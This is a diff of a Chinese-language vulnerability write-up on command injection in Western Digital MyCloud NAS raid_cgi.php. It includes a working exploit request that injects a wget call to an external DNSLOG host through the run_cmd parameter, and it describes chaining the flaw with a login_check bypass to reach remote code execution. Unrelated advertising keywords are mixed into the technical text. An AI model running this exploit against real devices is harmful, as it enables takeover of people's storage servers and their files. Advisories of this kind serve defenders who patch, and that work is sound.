@@ -8,6 +8,8 @@ asset_dir: embedded-base64
 
 Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS raid\_cgi.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
 
+漏洞利用分析
+
 # 影响版本
 
 <=2.11.153（老版本，已发布修复补丁）
@@ -73,21 +75,19 @@ switch ($action)
 
 深入探索
 
-CRM
+WebService
 
-云安全解决方案
+在线工具箱
 
-Docker加速服务
+网络安全书籍
 
 当**cmd=cgi\_Run\_Smart\_Test**时，`$run_cmd` 是直接拼接进**system**进行执行，期间对参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。
 
-漏洞扫描服务
+硬盘驱动器
 
 # 漏洞复现
 
 > 需要注意source\_dir应为数组形式，否则foreach循环判断会出错
->
-> 硬盘驱动器
 
 ```
 POST /web/storage/raid_cgi.php HTTP/1.1
@@ -102,4 +102,4 @@ cmd=cgi_Run_Smart_Test&run_cmd=$(wget raid.cgi.dnslog.pt)
 
 成功在DNSLOG平台收到DNS和HTTP请求
 
-云存储
+数据备份与恢复
